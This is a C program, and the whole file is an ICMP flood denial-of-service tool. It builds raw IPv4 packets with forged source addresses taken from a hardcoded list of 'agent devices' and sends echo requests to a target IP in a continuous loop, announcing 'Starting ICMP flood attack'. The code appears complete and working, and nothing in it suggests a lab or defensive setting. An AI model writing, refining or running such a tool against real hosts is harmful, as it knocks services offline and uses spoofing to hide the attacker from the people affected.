#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>

#define PACKET_SIZE 4096
#define MAX_SPOOFED_IPS 4

volatile int keep_running = 1;

void sig_handler(int sig) {
    if (sig == SIGINT) {
        keep_running = 0;
    }
}

unsigned short checksum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return(answer);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <target_ip>\n", argv[0]);
        return -1;
    }

    // Register signal handler for graceful termination
    signal(SIGINT, sig_handler);

    int sockfd;
    char packet[PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *) packet;
    struct icmphdr *icmph = (struct icmphdr *) (packet + sizeof(struct iphdr));
    struct sockaddr_in dest;
    
    // Spoofed IPs (agent devices)
    char *spoofed_ips[MAX_SPOOFED_IPS] = {"10.0.0.3", "10.0.0.4", "10.0.0.5", "10.0.0.6"};
    
    // Zero out the packet buffer
    memset(packet, 0, PACKET_SIZE);
    
    // Create raw socket (use IPPROTO_RAW when providing your own IP header)
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("Failed to create raw socket");
        printf("Note: Root privileges are required to create raw sockets.\n");
        exit(EXIT_FAILURE);
    }
    
    // Tell kernel not to generate IP headers
    int one = 1;
    const int *val = &one;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    
    // Set destination
    dest.sin_family = AF_INET;
    dest.sin_port = 0;
    if (inet_aton(argv[1], &dest.sin_addr) == 0) {
        fprintf(stderr, "Invalid target IP address\n");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    
    printf("Starting ICMP flood attack on %s\n", argv[1]);
    printf("Press Ctrl+C to stop...\n");
    
    srand(time(NULL)); // Seed random number generator
    
    // Send continuous ICMP echo requests with spoofed IPs
    while(keep_running) {
        for(int i = 0; i < MAX_SPOOFED_IPS && keep_running; i++) {
            // Zero out the packet buffer for each iteration
            memset(packet, 0, PACKET_SIZE);
            
            // Fill IP header
            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            int pkt_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + 32; // 32 bytes of data
            iph->tot_len = htons(pkt_len);
            iph->id = htons(rand() % 65535);
            iph->frag_off = 0;
            iph->ttl = 255;
            iph->protocol = IPPROTO_ICMP;
            iph->check = 0;
            if (inet_aton(spoofed_ips[i], (struct in_addr *)&iph->saddr) == 0) {
                fprintf(stderr, "Invalid spoofed IP address: %s\n", spoofed_ips[i]);
                continue;
            }
            iph->daddr = dest.sin_addr.s_addr;
            
            // IP checksum
            iph->check = checksum((unsigned short *) packet, sizeof(struct iphdr));
            
            // Fill ICMP header
            icmph->type = ICMP_ECHO; // Echo request
            icmph->code = 0;
            icmph->checksum = 0;
            icmph->un.echo.id = htons(getpid() & 0xFFFF);
            icmph->un.echo.sequence = htons(rand());
            
            // Add some data payload
            char *data = packet + sizeof(struct iphdr) + sizeof(struct icmphdr);
            for(int j = 0; j < 32; j++) {
                data[j] = 'A' + (j % 26);
            }
            
            // ICMP checksum
            icmph->checksum = checksum((unsigned short *) icmph, sizeof(struct icmphdr) + 32);
            
            // Debug: print destination we are about to send to
            printf("Sending packet to %s (spoofed src %s)\n", inet_ntoa(dest.sin_addr), spoofed_ips[i]);

            // Send the packet (use explicit packet length)
            if (sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
                perror("Failed to send packet");
            } else {
                printf("Sent ICMP packet from %s\n", spoofed_ips[i]);
            }
            
            // Small delay to control flood rate
            usleep(1000);
        }
    }
    
    printf("\nStopping ICMP flood attack...\n");
    close(sockfd);
    return 0;
}